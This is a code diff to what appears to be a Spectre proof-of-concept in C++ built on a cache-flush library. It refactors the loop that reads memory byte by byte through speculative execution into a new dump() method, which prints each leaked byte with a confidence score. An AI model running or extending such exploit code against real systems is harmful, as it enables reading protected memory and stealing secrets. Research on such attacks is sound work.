@@ -164,10 +164,32 @@ public:
     value[1] = (uint8_t) second;
     score[1] = results[second];
   }
+
+
+  void dump(const void* target_ptr, size_t target_len) {
+    for (const char* ptr = (const char*)target_ptr; ptr < (const char*)target_ptr + target_len; ptr++) {
+      uint8_t value[2];
+      int score[2];
+
+      printf("Reading at %p... ", ptr);
+      readMemoryByte(ptr, value, score);
+      printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
+      printf("0x%02X=’%c’ score=%d ", value[0],
+        (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
+      if (score[1] > 0)
+        printf("(second best: 0x%02X score=%d)", value[1], score[1]);
+      printf("\n");
+    }
+  }
 } ALIGN_CACHE;
+
+
 
 LibFlush libflush(COUNTER_THREAD_CPU);
 Spectre spectre(libflush);
+
+
+
 
 int main(int argc, const char** argv) {
   // Read CLI arguments: data pointer and lenght
@@ -184,20 +206,7 @@ int main(int argc, const char** argv) {
     return -1;
   }
 
-  printf("Reading %d bytes at %p\n", target_len, target_ptr);
-  while (target_len--) {
-    uint8_t value[2];
-    int score[2];
-
-    printf("Reading at %p... ", target_ptr);
-    spectre.readMemoryByte(target_ptr++, value, score);
-    printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
-    printf("0x%02X=’%c’ score=%d ", value[0],
-      (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
-    if (score[1] > 0)
-      printf("(second best: 0x%02X score=%d)", value[1], score[1]);
-    printf("\n");
-  }
+  spectre.dump(target_ptr, target_len);
 
   return (0);
 }
